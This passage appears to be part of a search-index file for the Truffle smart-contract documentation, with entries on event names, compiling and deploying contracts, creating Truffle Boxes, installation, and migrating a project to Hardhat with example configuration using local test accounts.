"title": "\"fetchSolcList:succeed\""}, {"location": "docs/truffle/concepts/event-system/#fetchsolclistfail", "text": "Emitted emitted if downloading the list of Solidity compiler versions fails No data available for this event.", "title": "\"fetchSolcList:fail\""}, {"location": "docs/truffle/concepts/event-system/#truffle-unbox", "text": "", "title": "truffle unbox"}, {"location": "docs/truffle/concepts/event-system/#unboxstart", "text": "Emitted at the start of command flow. No data available for this event.", "title": "\"unbox:start\""}, {"location": "docs/truffle/concepts/event-system/#unboxsucceed", "text": "Emitted at the end of command flow. { boxConfig: <object: contents of the `truffle-box.json` for the given box> }", "title": "\"unbox:succeed\""}, {"location": "docs/truffle/concepts/event-system/#unboxfail", "text": "Emitted if the unbox fails. No data available for this event.", "title": "\"unbox:fail\""}, {"location": "docs/truffle/concepts/event-system/#unboxpreparingtodownloadstart", "text": "Emitted before setting up a temporary directory for the downloaded contents. No data available for this event.", "title": "\"unbox:preparingToDownload:start\""}, {"location": "docs/truffle/concepts/event-system/#unboxpreparingtodownloadsucceed", "text": "Emitted after creating the temporary directory for the downloaded contents. No data available for this event.", "title": "\"unbox:preparingToDownload:succeed\""}, {"location": "docs/truffle/concepts/event-system/#unboxdownloadingboxstart", "text": "Emitted before attempting to download the box contents. No data available for this event.", "title": "\"unbox:downloadingBox:start\""}, {"location": "docs/truffle/concepts/event-system/#unboxdownloadingboxsucceed", "text": "Emitted after downloading the box contents. No data available for this event.", "title": "\"unbox:downloadingBox:succeed\""}, {"location": "docs/truffle/concepts/event-system/#unboxcleaningtempfilesstart", "text": "Emitted before removing the temporary files. No data available for this event.", "title": "\"unbox:cleaningTempFiles:start\""}, {"location": "docs/truffle/concepts/event-system/#unboxcleaningtempfilessucceed", "text": "Emitted after removing the temporary files. No data available for this event.", "title": "\"unbox:cleaningTempFiles:succeed\""}, {"location": "docs/truffle/concepts/event-system/#unboxsettingupboxstart", "text": "Emitted before installing box dependencies. No data available for this event.", "title": "\"unbox:settingUpBox:start\""}, {"location": "docs/truffle/concepts/event-system/#unboxsettingupboxsucceed", "text": "Emitted after installing box dependencies. No data available for this event.", "title": "\"unbox:settingUpBox:succeed\""}, {"location": "docs/truffle/concepts/filecoin/", "text": "Filecoin support \u00b6 Truffle provides Filecoin integration that works out of the box, meaning there's no need to install any special Truffle version. View the Filecoin box tutorial to learn how to use Truffle to build dapps on the Filecoin network.", "title": "Filecoin support"}, {"location": "docs/truffle/concepts/filecoin/#filecoin-support", "text": "Truffle provides Filecoin integration that works out of the box, meaning there's no need to install any special Truffle version. View the Filecoin box tutorial to learn how to use Truffle to build dapps on the Filecoin network.", "title": "Filecoin support"}, {"location": "docs/truffle/concepts/networks-and-app-deployment/", "text": "Network and app deployment \u00b6 Even the smallest project will interact with at the very least two blockchain nodes: One on the developer's machine, like Ganache or Truffle Develop, and the other representing the network where the developer will eventually deploy their application (such as the main public Ethereum network or a private consortium network, for instance). Truffle provides a system for managing the compilation and deployment artifacts for each network, and does so in a way that simplifies final application deployment. Configuration \u00b6 See the Configuration section for more information. Specify a network \u00b6 Most Truffle commands will behave differently based on the network specified, and will use that network's contracts and configuration. You can specify a network using the --network option, like below: $ truffle migrate --network live In this example, Truffle will run your migrations on the \"live\" network, which -- if configured like the example -- is associated with the public Ethereum blockchain. Build artifacts \u00b6 As mentioned in the Compiling contracts section, build artifacts are stored in the ./build/contracts directory as .json files. When you compile your contracts or run your migrations using a specific network, Truffle will update those .json files so they contain the information related to that network. When those artifacts are used later -- such as within your frontend or application via @truffle/contract -- they'll automatically detect which network the Ethereum client is connected to and use the correct contract artifacts accordingly. Deploy an application \u00b6 Because the network is auto-detected by the contract artifacts at runtime, this means that you only need to deploy your application or frontend once . When you run your application, the running Ethereum client will determine which artifacts are used, and this will make your application very flexible. As an example, if you were to deploy a web application to https://mydapp.io, you could navigate to that address using your favorite wallet-browser (like MetaMask, or Mist) and your dapp would work correctly regardless of the Ethereum network the wallet-browser was connected to. If the wallet-browser was connected to the live network, your dapp would use the contracts you deployed on the live network. If on Ropsten, the contracts you deployed to Ropsten would be used. Source code verification \u00b6 After deploying your application, you might want to use Etherscan 's source code verification. Etherscan is one of the most popular block explorers for Ethereum, and by verifying your smart contract source code on their platform users can see what your smart contracts do before they use your application. This helps to grow trust in your smart contracts and your application. One way to do this is the Etherscan web form , but the easiest way is using truffle-plugin-verify . This plugin integrates directly with Truffle's workflow to verify your smart contracts' source code. Read more about setting up and using this plugin in the guide Automatically verify Truffle smart contracts on Etherscan .", "title": "Networks and app deployments"}, {"location": "docs/truffle/concepts/networks-and-app-deployment/#network-and-app-deployment", "text": "Even the smallest project will interact with at the very least two blockchain nodes: One on the developer's machine, like Ganache or Truffle Develop, and the other representing the network where the developer will eventually deploy their application (such as the main public Ethereum network or a private consortium network, for instance). Truffle provides a system for managing the compilation and deployment artifacts for each network, and does so in a way that simplifies final application deployment.", "title": "Network and app deployment"}, {"location": "docs/truffle/concepts/networks-and-app-deployment/#configuration", "text": "See the Configuration section for more information.", "title": "Configuration"}, {"location": "docs/truffle/concepts/networks-and-app-deployment/#specify-a-network", "text": "Most Truffle commands will behave differently based on the network specified, and will use that network's contracts and configuration. You can specify a network using the --network option, like below: $ truffle migrate --network live In this example, Truffle will run your migrations on the \"live\" network, which -- if configured like the example -- is associated with the public Ethereum blockchain.", "title": "Specify a network"}, {"location": "docs/truffle/concepts/networks-and-app-deployment/#build-artifacts", "text": "As mentioned in the Compiling contracts section, build artifacts are stored in the ./build/contracts directory as .json files. When you compile your contracts or run your migrations using a specific network, Truffle will update those .json files so they contain the information related to that network. When those artifacts are used later -- such as within your frontend or application via @truffle/contract -- they'll automatically detect which network the Ethereum client is connected to and use the correct contract artifacts accordingly.", "title": "Build artifacts"}, {"location": "docs/truffle/concepts/networks-and-app-deployment/#deploy-an-application", "text": "Because the network is auto-detected by the contract artifacts at runtime, this means that you only need to deploy your application or frontend once . When you run your application, the running Ethereum client will determine which artifacts are used, and this will make your application very flexible. As an example, if you were to deploy a web application to https://mydapp.io, you could navigate to that address using your favorite wallet-browser (like MetaMask, or Mist) and your dapp would work correctly regardless of the Ethereum network the wallet-browser was connected to. If the wallet-browser was connected to the live network, your dapp would use the contracts you deployed on the live network. If on Ropsten, the contracts you deployed to Ropsten would be used.", "title": "Deploy an application"}, {"location": "docs/truffle/concepts/networks-and-app-deployment/#source-code-verification", "text": "After deploying your application, you might want to use Etherscan 's source code verification. Etherscan is one of the most popular block explorers for Ethereum, and by verifying your smart contract source code on their platform users can see what your smart contracts do before they use your application. This helps to grow trust in your smart contracts and your application. One way to do this is the Etherscan web form , but the easiest way is using truffle-plugin-verify . This plugin integrates directly with Truffle's workflow to verify your smart contracts' source code. Read more about setting up and using this plugin in the guide Automatically verify Truffle smart contracts on Etherscan .", "title": "Source code verification"}, {"location": "docs/truffle/how-to/compile-contracts/", "text": "Compile contracts \u00b6 Location \u00b6 All of your contracts are located in your project's contracts/ directory. As contracts are written in Solidity , all files containing contracts will have a file extension of .sol . Associated Solidity libraries will also have a .sol extension. Command \u00b6 To compile a Truffle project, change to the root of the directory where the project is located and then type the following into a terminal: truffle compile Upon first run, all contracts will be compiled. Upon subsequent runs, Truffle will compile only the contracts that have been changed since the last compile. If you'd like to override this behavior, run the above command with the --all option. Build artifacts \u00b6 Artifacts of your compilation will be placed in the build/contracts/ directory, relative to your project root. (This directory will be created if it does not exist.) The name of the generated artifact .json files do not reflect the name of the source file but the name of the contract definition . This means that changing the contract name string in the artifacts.require method to match that of the source file may lead to a Error: Could not find artifacts for {yourContract} from any sources if the contained smart contract definition is named differently. These artifacts are integral to the inner workings of Truffle, and they play an important part in the successful deployment of your application. You should not edit these files as they'll be overwritten by contract compilation and deployment. Dependencies \u00b6 You can declare contract dependencies using Solidity's import command. Truffle will compile contracts in the correct order and ensure all dependencies are sent to the compiler. Dependencies can be specified in two ways: Importing dependencies via file name \u00b6 To import contracts from a separate file, add the following code to your Solidity source file: import \"./AnotherContract.sol\" ; This will make all contracts within AnotherContract.sol available. Here, AnotherContract.sol is relative to the path of the current contract being written. Note that Solidity allows other import syntaxes as well. See the Solidity import documentation for more information. Importing contracts from an external package \u00b6 Truffle supports dependencies installed via NPM . To import contracts from a dependency, use the following syntax import \"somepackage/SomeContract.sol\" ; Here, somepackage represents a package installed via NPM, and SomeContract.sol represents a Solidity source file provided by that package. For more information on how to use Truffle's package management features, please see the Truffle NPM documentation.", "title": "Compile a project"}, {"location": "docs/truffle/how-to/compile-contracts/#compile-contracts", "text": "", "title": "Compile contracts"}, {"location": "docs/truffle/how-to/compile-contracts/#location", "text": "All of your contracts are located in your project's contracts/ directory. As contracts are written in Solidity , all files containing contracts will have a file extension of .sol . Associated Solidity libraries will also have a .sol extension.", "title": "Location"}, {"location": "docs/truffle/how-to/compile-contracts/#command", "text": "To compile a Truffle project, change to the root of the directory where the project is located and then type the following into a terminal: truffle compile Upon first run, all contracts will be compiled. Upon subsequent runs, Truffle will compile only the contracts that have been changed since the last compile. If you'd like to override this behavior, run the above command with the --all option.", "title": "Command"}, {"location": "docs/truffle/how-to/compile-contracts/#build-artifacts", "text": "Artifacts of your compilation will be placed in the build/contracts/ directory, relative to your project root. (This directory will be created if it does not exist.) The name of the generated artifact .json files do not reflect the name of the source file but the name of the contract definition . This means that changing the contract name string in the artifacts.require method to match that of the source file may lead to a Error: Could not find artifacts for {yourContract} from any sources if the contained smart contract definition is named differently. These artifacts are integral to the inner workings of Truffle, and they play an important part in the successful deployment of your application. You should not edit these files as they'll be overwritten by contract compilation and deployment.", "title": "Build artifacts"}, {"location": "docs/truffle/how-to/compile-contracts/#dependencies", "text": "You can declare contract dependencies using Solidity's import command. Truffle will compile contracts in the correct order and ensure all dependencies are sent to the compiler. Dependencies can be specified in two ways:", "title": "Dependencies"}, {"location": "docs/truffle/how-to/compile-contracts/#importing-dependencies-via-file-name", "text": "To import contracts from a separate file, add the following code to your Solidity source file: import \"./AnotherContract.sol\" ; This will make all contracts within AnotherContract.sol available. Here, AnotherContract.sol is relative to the path of the current contract being written. Note that Solidity allows other import syntaxes as well. See the Solidity import documentation for more information.", "title": "Importing dependencies via file name"}, {"location": "docs/truffle/how-to/compile-contracts/#importing-contracts-from-an-external-package", "text": "Truffle supports dependencies installed via NPM . To import contracts from a dependency, use the following syntax import \"somepackage/SomeContract.sol\" ; Here, somepackage represents a package installed via NPM, and SomeContract.sol represents a Solidity source file provided by that package. For more information on how to use Truffle's package management features, please see the Truffle NPM documentation.", "title": "Importing contracts from an external package"}, {"location": "docs/truffle/how-to/create-a-project/", "text": "Create a project \u00b6 Most Truffle commands require that you run them against an existing Truffle project. So the first step is to create a Truffle project. You can create a bare project, but for those just getting started, you can use Truffle Boxes , which are example applications and project templates. We'll use the MetaCoin box , which creates a token that can be transferred between accounts: Create a new directory for your Truffle project: mkdir MetaCoin cd MetaCoin Download (\"unbox\") the MetaCoin box: truffle unbox metacoin Note : You can use the truffle unbox <box-name> command to download any of the other Truffle Boxes . Note : To create a bare Truffle project with no smart contracts included, use truffle init . Note : You can use an optional --force to initialize the project in the current directory regardless of its state (e.g. even if it contains other files or directories). This applies to both the `init` and `unbox` commands. Be careful, this will potentially overwrite files that exist in the directory. Once this operation is completed, you'll now have a project structure with the following items: contracts/ : Directory for Solidity contracts migrations/ : Directory for scriptable deployment files test/ : Directory for test files for testing your application and contracts truffle-config.js : Truffle configuration file", "title": "Create a project"}, {"location": "docs/truffle/how-to/create-a-project/#create-a-project", "text": "Most Truffle commands require that you run them against an existing Truffle project. So the first step is to create a Truffle project. You can create a bare project, but for those just getting started, you can use Truffle Boxes , which are example applications and project templates. We'll use the MetaCoin box , which creates a token that can be transferred between accounts: Create a new directory for your Truffle project: mkdir MetaCoin cd MetaCoin Download (\"unbox\") the MetaCoin box: truffle unbox metacoin Note : You can use the truffle unbox <box-name> command to download any of the other Truffle Boxes . Note : To create a bare Truffle project with no smart contracts included, use truffle init . Note : You can use an optional --force to initialize the project in the current directory regardless of its state (e.g. even if it contains other files or directories). This applies to both the `init` and `unbox` commands. Be careful, this will potentially overwrite files that exist in the directory. Once this operation is completed, you'll now have a project structure with the following items: contracts/ : Directory for Solidity contracts migrations/ : Directory for scriptable deployment files test/ : Directory for test files for testing your application and contracts truffle-config.js : Truffle configuration file", "title": "Create a project"}, {"location": "docs/truffle/how-to/create-a-truffle-box/", "text": "Create a Truffle Box \u00b6 Create a box \u00b6 To create a Truffle Box you'll need a few things: * A GitHub repository * A configuration file * Optionally, small and large images for the box's listing The configuration file and images belong in the top-level directory of your repo. With these files in place, and your repo on GitHub, the unbox command will be: truffle unbox {USER_NAME || ORG_NAME}/{REPO_NAME} If you're starting from scratch , we've created a blueprint box containing a configuration file with common values, as well as template versions of the small and large images. If you're using an existing project , download the files here and extract them into your project. Configuration file \u00b6 All truffle boxes include a configuration file, truffle-box.json . This file has three attributes: ignore , commands , and hooks . ignore (array) \u00b6 An array of files or relative paths you'd like Truffle to ignore when unboxing. Common files include the readme.md or .gitignore . These files will not be copied over from the box's repo when you unbox. \"ignore\" : [ \"README.md\" , \".gitignore\" ] commands (object) \u00b6 An object whose key/value pairs are a descriptor and console command respectively. These pairs will be shown to users once your box is successfully unboxed. Think of these as quick instructions. For example, consider the object below. We've given our users all they need to compile, migrate and test their smart contracts, along with commands for developing the front-end. \"commands\" : { \"Compile\" : \"truffle compile\" , \"Migrate\" : \"truffle migrate\" , \"Test contracts\" : \"truffle test\" , \"Test dapp\" : \"npm test\" , \"Run dev server\" : \"npm run start\" , \"Build for production\" : \"npm run build\" } hooks (object) \u00b6 An object containing console commands to execute once unboxed. Since we're working in Node.js, most commonly this will contain npm install . \"hooks\" : { \"post-unpack\" : \"npm install\" } Images \u00b6 The large box image is a 348px square with 20px of padding on each side. The small box image is 510px x 100px. There is 20px of padding on the left side of the banner and it's minimum size (described in the template as \"Min-Width\") is 330px, including the left padding. The banners are fixed to the left side and crop off the right side as the window narrows. If no images are provided in a box, we default to banners containing the Truffle logo: Truffle site listing \u00b6 Before being listed on the Truffle website, all boxes undergo a screening process to ensure compatibility with Truffle. To start the pre-screening process, send us an email with your desired box name and brief description, along with a link to its GitHub repo to: boxes@trufflesuite.com .", "title": "Create a Truffle Box"}, {"location": "docs/truffle/how-to/create-a-truffle-box/#create-a-truffle-box", "text": "", "title": "Create a Truffle Box"}, {"location": "docs/truffle/how-to/create-a-truffle-box/#create-a-box", "text": "To create a Truffle Box you'll need a few things: * A GitHub repository * A configuration file * Optionally, small and large images for the box's listing The configuration file and images belong in the top-level directory of your repo. With these files in place, and your repo on GitHub, the unbox command will be: truffle unbox {USER_NAME || ORG_NAME}/{REPO_NAME} If you're starting from scratch , we've created a blueprint box containing a configuration file with common values, as well as template versions of the small and large images. If you're using an existing project , download the files here and extract them into your project.", "title": "Create a box"}, {"location": "docs/truffle/how-to/create-a-truffle-box/#configuration-file", "text": "All truffle boxes include a configuration file, truffle-box.json . This file has three attributes: ignore , commands , and hooks .", "title": "Configuration file"}, {"location": "docs/truffle/how-to/create-a-truffle-box/#ignore-array", "text": "An array of files or relative paths you'd like Truffle to ignore when unboxing. Common files include the readme.md or .gitignore . These files will not be copied over from the box's repo when you unbox. \"ignore\" : [ \"README.md\" , \".gitignore\" ]", "title": "ignore (array)"}, {"location": "docs/truffle/how-to/create-a-truffle-box/#commands-object", "text": "An object whose key/value pairs are a descriptor and console command respectively. These pairs will be shown to users once your box is successfully unboxed. Think of these as quick instructions. For example, consider the object below. We've given our users all they need to compile, migrate and test their smart contracts, along with commands for developing the front-end. \"commands\" : { \"Compile\" : \"truffle compile\" , \"Migrate\" : \"truffle migrate\" , \"Test contracts\" : \"truffle test\" , \"Test dapp\" : \"npm test\" , \"Run dev server\" : \"npm run start\" , \"Build for production\" : \"npm run build\" }", "title": "commands (object)"}, {"location": "docs/truffle/how-to/create-a-truffle-box/#hooks-object", "text": "An object containing console commands to execute once unboxed. Since we're working in Node.js, most commonly this will contain npm install . \"hooks\" : { \"post-unpack\" : \"npm install\" }", "title": "hooks (object)"}, {"location": "docs/truffle/how-to/create-a-truffle-box/#images", "text": "The large box image is a 348px square with 20px of padding on each side. The small box image is 510px x 100px. There is 20px of padding on the left side of the banner and it's minimum size (described in the template as \"Min-Width\") is 330px, including the left padding. The banners are fixed to the left side and crop off the right side as the window narrows. If no images are provided in a box, we default to banners containing the Truffle logo:", "title": "Images"}, {"location": "docs/truffle/how-to/create-a-truffle-box/#truffle-site-listing", "text": "Before being listed on the Truffle website, all boxes undergo a screening process to ensure compatibility with Truffle. To start the pre-screening process, send us an email with your desired box name and brief description, along with a link to its GitHub repo to: boxes@trufflesuite.com .", "title": "Truffle site listing"}, {"location": "docs/truffle/how-to/install/", "text": "Installation \u00b6 Requirements \u00b6 Node.js v14 - v18 Windows, Linux, or macOS Install Node.js \u00b6 Note: to install the latest version of npm , run npm i -g npm Node Package Manager (NPM) recommends installing Node.js and npm with a Node version manager to avoid permission errors when installing globally. To do so, follow the instructions for your operating system here . Truffle requires node-gyp for compiling native add-on modules for Node.js. Truffle recommends installing the following node-gyp to avoid errors when installing Truffle. Follow the installation instructions here . Use nvm to install a compatible version of Node.js. For example, to install Node.js v18 on OSX or Linux, run: nvm install 18 Confirm that Node.js has been installed correctly by running node --version . Install Truffle \u00b6 Warning : Avoid using the sudo command when installing Truffle, this can cause permission errors. In a terminal, use NPM to install Truffle: npm install -g truffle You may receive a list of warnings during installation. To confirm that Truffle was installed correctly, run: truffle version Ethereum client \u00b6 Truffle requires a running Ethereum client which supports the standard JSON-RPC API. There are many to choose from, and some better than others for development. Refer to the Ethereum client section for more information.", "title": "Install Truffle"}, {"location": "docs/truffle/how-to/install/#installation", "text": "", "title": "Installation"}, {"location": "docs/truffle/how-to/install/#requirements", "text": "Node.js v14 - v18 Windows, Linux, or macOS", "title": "Requirements"}, {"location": "docs/truffle/how-to/install/#install-nodejs", "text": "Note: to install the latest version of npm , run npm i -g npm Node Package Manager (NPM) recommends installing Node.js and npm with a Node version manager to avoid permission errors when installing globally. To do so, follow the instructions for your operating system here . Truffle requires node-gyp for compiling native add-on modules for Node.js. Truffle recommends installing the following node-gyp to avoid errors when installing Truffle. Follow the installation instructions here . Use nvm to install a compatible version of Node.js. For example, to install Node.js v18 on OSX or Linux, run: nvm install 18 Confirm that Node.js has been installed correctly by running node --version .", "title": "Install Node.js"}, {"location": "docs/truffle/how-to/install/#install-truffle", "text": "Warning : Avoid using the sudo command when installing Truffle, this can cause permission errors. In a terminal, use NPM to install Truffle: npm install -g truffle You may receive a list of warnings during installation. To confirm that Truffle was installed correctly, run: truffle version", "title": "Install Truffle"}, {"location": "docs/truffle/how-to/install/#ethereum-client", "text": "Truffle requires a running Ethereum client which supports the standard JSON-RPC API. There are many to choose from, and some better than others for development. Refer to the Ethereum client section for more information.", "title": "Ethereum client"}, {"location": "docs/truffle/how-to/migrate-to-hardhat/", "text": "Migrate to Hardhat \u00b6 Like Truffle, Hardhat is a development environment for Ethereum software. It consists of different components for editing, compiling, debugging, and deploying smart contracts and dapps. We'll provide two methods for migrating to Hardhat: Use the Hardhat plugin : Use the Hardhat plugin to integrate with your Truffle files. This is essentially a partial migration that allows you to run tests and scripts written for Truffle using Hardhat. Perform a full migration : Configure Hardhat and migrate your scripts and tests to run natively in Hardhat Runner. Use the Hardhat plugin \u00b6 Use the hardhat-truffle plugin to use Truffle contracts in a Hardhat environment. The plugin provides a bridge between the Truffle and Hardhat environments, allowing developers to use Truffle contracts and libraries within a Hardhat project. The following steps outline the process for using the Hardhat plugins. Refer to the Hardhat instructions for more information about using the plugin. Install Hardhat and required plugins \u00b6 Install Hardhat using the following command: npm install --save-dev hardhat Install the required plugins: npm install --save-dev @nomiclabs/hardhat-truffle5 @nomiclabs/hardhat-web3 'web3@^1.0.0-beta.36' Create a Hardhat configuration file \u00b6 Create a hardhat.config.js (or hardhat.config.ts if using Typescript) file that matches your Truffle configuration file settings. Refer to the Hardhat documentation for advanced parameters. Add the following statement to your configuration file: Javascript Typescript require ( \"@nomiclabs/hardhat-truffle5\" ); import \"@nomiclabs/hardhat-truffle5\" ; Create the hardhat-truffle fixure \u00b6 If your project uses Truffle migrations to initialize your testing environment (your tests call Contract.deployed() ), then you need to adapt your migrations to become a hardhat-truffle fixture. Create a test/truffle-fixture.js file that deploys your contracts and calls the setAsDeployed() method on each contract abstractions you want to test. For example, the following file in the Truffle migrations folder: const Greeter = artifacts . require ( \"Greeter\" ); module . exports = function ( deployer ) { deployer . deploy ( Greeter ); }; Must be converted to the following in the test/truffle-fixture.js file: const Greeter = artifacts . require ( \"Greeter\" ); module . exports = async () => { const greeter = await Greeter . new (); Greeter . setAsDeployed ( greeter ); }; Refer to the Hardhat fixtures documentation for more information. You can now compile, test, and deploy your contracts. Perform a full migration \u00b6 You can perform a full migration of your Truffle project to Hardhat. The process involves installing and configuring Hardhat, then updating your tests and scripts. Alternatively, use the Hardhat plugins to use Truffle contracts in a Hardhat environment. This section provides some general steps you need to perform to fully migrate an existing Truffle project to Hardhat. Install Hardhat \u00b6 Install Hardhat using the following command: npm install --save-dev hardhat Update the folder structure \u00b6 Update the Truffle folder structure as follows: Rename the migrations directory to scripts . Create a hardhat.config.js file with your network details and Solidity settings. Refer to the Hardhat documentation for advanced parameters. The standard folder structure for Truffle and Hardhat is as follows: Truffle folder structure Hardhat folder structure truffle \u251c\u2500\u2500 truffle-config.js \u251c\u2500\u2500 contracts // source files for your contracts \u251c\u2500\u2500 migrations // location for your scripts, for example to deploy to a chain \u251c\u2500\u2500 test // contract tests hardhat \u251c\u2500\u2500 hardhat.config.js // hardhat network config \u251c\u2500\u2500 contracts // source files for your contracts \u251c\u2500\u2500 scripts // location for your scripts, for example to deploy to a chain \u251c\u2500\u2500 test // contract tests Compile, test, and deploy contracts \u00b6 You may need to swap Truffle's native web3 for Hardhat's Web3.js or ethers.js plugins to deploy your contract. Refer to the Hardhat documentation for more information on deploying contracts. Use the following steps to compile, test, and deploy your contracts on Hardhat: Install dependencies listed in your project's package.json file: npm i Compile the contracts in your Hardhat project: npx hardhat compile Test your contract: npx hardhat test Test a contract deployment: npx hardhat run scripts/deploy.js When Hardhat executes your tests, scripts, or tasks, an in-process Hardhat Network node is started automatically. Alternatively, you can specify a network configured in the hardhat.config.js file, with the --network option. For example: npx hardhat run --network <your-network> scripts/deploy.js Run a local Ethereum network node \u00b6 Testing locally is different because Ganache is not available as a local Ethereum network node. Hardhat uses Hardhat Network as its local Ethereum network node. To run a local Ethereum test network that exposes a JSON-RPC interface to Hardhat Network, run: npx hardhat node You can configure Hardhat Network in the hardhat.config.js file. For example, this configuration file defines a network named quickstart . You can then deploy your contract to the configured network using a command similar to: npx hardhat run --network quickstart scripts/deploy.js Configure your wallet \u00b6 To use a hierarchical deterministic (HD) wallet with Hardhat, set the accounts field in the hardhat.config.js file. For example: module . exports = { networks : { sepolia : { url : \"...\" , accounts : { mnemonic : \"test test test test test test test test test test test junk\" , path : \"m/44'/60'/0'/0\" , initialIndex : 0 , count : 20 , passphrase : \"\" , }, }, }, }; You can also load accounts that you can access using the Ethers Signer interface module . exports = { networks : { // in built test network to use when developing contracts hardhat : { chainId : 1337 }, quickstart : { url : \"http://127.0.0.1:8545\" , chainId : 1337 , // test accounts only, all good ;) accounts : [ \"0x8f2a55949038a9610f50fb23b5883af3b4ecb3c3bb792cbcefbd1542c692be63\" , \"0xc87509a1c067bbde78beb793e6fa76530b6382a4c0241e5e4a9ec0a0f44dc0d3\" , \"0xae6ae8e5ccbfb04590405997ee2d52d2b330726137b875053c36d94e974d162f\" ] }, } } You can access the first 2 accounts using the following code: const [ owner , otherAccount ] = await ethers . getSigners (); Generate the wallet from a mnemonic phrase \u00b6 In your code, generate the wallet from a mnemonic phrase defined in your hardhat.config.js file as follows: import { ethers } = require ( \"ethers\" ); import { HDNodeWallet } from 'ethers' ; let node = ethers . HDNodeWallet . fromMnemonic ( words ) Connect with MetaMask \u00b6 To connect to your HardHat Network using your MetaMask wallet, use the following: const provider = new ethers . BrowserProvider ( window . ethereum ) Load a wallet from an existing private key \u00b6 You can load a wallet from an existing private key on your specified network, using the following code: import { ethers } from \"hardhat\" const provider = new ethers . JsonRpcApiProvider ( \"JSON-RPC-http-endpoint\" ); const wallet = new ethers . Wallet ( \"0xMY_PRIVATE_KEY\" ); const signer = wallet . connect ( provider ); # optionally with a provider directly const wallet = new ethers . Wallet ( \"0xMY_PRIVATE_KEY\" , provider ); References \u00b6 HardHat developer documentation Example scripts to send transactions", "title": "Migrate to Hardhat"}, {"location": "docs/truffle/how-to/migrate-to-hardhat/#migrate-to-hardhat", "text": "Like Truffle, Hardhat is a development environment for Ethereum software. It consists of different components for editing, compiling, debugging, and deploying smart contracts and dapps. We'll provide two methods for migrating to Hardhat: Use the Hardhat plugin : Use the Hardhat plugin to integrate with your Truffle files. This is essentially a partial migration that allows you to run tests and scripts written for Truffle using Hardhat. Perform a full migration : Configure Hardhat and migrate your scripts and tests to run natively in Hardhat Runner.", "title": "Migrate to Hardhat"}, {"location": "docs/truffle/how-to/migrate-to-hardhat/#use-the-hardhat-plugin", "text": "Use the hardhat-truffle plugin to use Truffle contracts in a Hardhat environment. The plugin provides a bridge between the Truffle and Hardhat environments, allowing developers to use Truffle contracts and libraries within a Hardhat project. The following steps outline the process for using the Hardhat plugins. Refer to the Hardhat instructions for more information about using the plugin.", "title": "Use the Hardhat plugin"}, {"location": "docs/truffle/how-to/migrate-to-hardhat/#install-hardhat-and-required-plugins", "text": "Install Hardhat using the following command: npm install --save-dev hardhat Install the required plugins: npm install --save-dev @nomiclabs/hardhat-truffle5 @nomiclabs/hardhat-web3 'web3@^1.0.0-beta.36'", "title": "Install Hardhat and required plugins"}, {"location": "docs/truffle/how-to/migrate-to-hardhat/#create-a-hardhat-configuration-file", "text": "Create a hardhat.config.js (or hardhat.config.ts if using Typescript) file that matches your Truffle configuration file settings. Refer to the Hardhat documentation for advanced parameters. Add the following statement to your configuration file: Javascript Typescript require ( \"@nomiclabs/hardhat-truffle5\" ); import \"@nomiclabs/hardhat-truffle5\" ;", "title": "Create a Hardhat configuration file"}, {"location": "docs/truffle/how-to/migrate-to-hardhat/#create-the-hardhat-truffle-fixure", "text": "If your project uses Truffle migrations to initialize your testing environment (your tests call Contract.deployed() ), then you need to adapt your migrations to become a hardhat-truffle fixture. Create a test/truffle-fixture.js file that deploys your contracts and calls the setAsDeployed() method on each contract abstractions you want to test. For example, the following file in the Truffle migrations folder: const Greeter = artifacts . require ( \"Greeter\" ); module . exports = function ( deployer ) { deployer . deploy ( Greeter ); }; Must be converted to the following in the test/truffle-fixture.js file: const Greeter = artifacts . require ( \"Greeter\" ); module . exports = async () => { const greeter = await Greeter . new (); Greeter . setAsDeployed ( greeter ); }; Refer to the Hardhat fixtures documentation for more information. You can now compile, test, and deploy your contracts.", "title": "Create the hardhat-truffle fixure"}, {"location": "docs/truffle/how-to/migrate-to-hardhat/#perform-a-full-migration", "text": "You can perform a full migration of your Truffle project to Hardhat. The process involves installing and configuring Hardhat, then updating your tests and scripts. Alternatively, use the Hardhat plugins to use Truffle contracts in a Hardhat environment. This section provides some general steps you need to perform to fully migrate an existing Truffle project to Hardhat.", "title": "Perform a full migration"}, {"location": "docs/truffle/how-to/migrate-to-hardhat/#install-hardhat", "text": "Install Hardhat using the following command: npm install --save-dev hardhat", "title": "Install Hardhat"}, {"location": "docs/truffle/how-to/migrate-to-hardhat/#update-the-folder-structure", "text": "Update the Truffle folder structure as follows: Rename the migrations directory to scripts . Create a hardhat.config.js file with your network details and Solidity settings. Refer to the Hardhat documentation for advanced parameters. The standard folder structure for Truffle and Hardhat is as follows: Truffle folder structure Hardhat folder structure truffle \u251c\u2500\u2500 truffle-config.js \u251c\u2500\u2500 contracts // source files for your contracts \u251c\u2500\u2500 migrations // location for your scripts, for example to deploy to a chain \u251c\u2500\u2500 test // contract tests hardhat \u251c\u2500\u2500 hardhat.config.js // hardhat network config \u251c\u2500\u2500 contracts // source files for your contracts \u251c\u2500\u2500 scripts // location for your scripts, for example to deploy to a chain \u251c\u2500\u2500 test // contract tests", "title": "Update the folder structure"}, {"location": "docs/truffle/how-to/migrate-to-hardhat/#compile-test-and-deploy-contracts", "text": "You may need to swap Truffle's native web3 for Hardhat's Web3.js or ethers.js plugins to deploy your contract. Refer to the Hardhat documentation for more information on deploying contracts. Use the following steps to compile, test, and deploy your contracts on Hardhat: Install dependencies listed in your project's package.json file: npm i Compile the contracts in your Hardhat project: npx hardhat compile Test your contract: npx hardhat test Test a contract deployment: npx hardhat run scripts/deploy.js When Hardhat executes your tests, scripts, or tasks, an in-process Hardhat Network node is started automatically. Alternatively, you can specify a network configured in the hardhat.config.js file, with the --network option. For example: npx hardhat run --network <your-network> scripts/deploy.js", "title": "Compile, test, and deploy contracts"}, {"location": "docs/truffle/how-to/migrate-to-hardhat/#run-a-local-ethereum-network-node", "text": "Testing locally is different because Ganache is not available as a local Ethereum network node. Hardhat uses Hardhat Network as its local Ethereum network node. To run a local Ethereum test network that exposes a JSON-RPC interface to Hardhat Network, run: npx hardhat node You can configure Hardhat Network in the hardhat.config.js file. For example, this configuration file defines a network named quickstart . You can then deploy your contract to the configured network using a command similar to: npx hardhat run --network quickstart scripts/deploy.js", "title": "Run a local Ethereum network node"}, {"location": "docs/truffle/how-to/migrate-to-hardhat/#configure-your-wallet", "text": "To use a hierarchical deterministic (HD) wallet with Hardhat, set the accounts field in the hardhat.config.js file. For example: module . exports = { networks : { sepolia : { url : \"...\" , accounts : { mnemonic : \"test test test test test test test test test test test junk\" , path : \"m/44'/60'/0'/0\" , initialIndex : 0 , count : 20 , passphrase : \"\" , }, }, }, }; You can also load accounts that you can access using 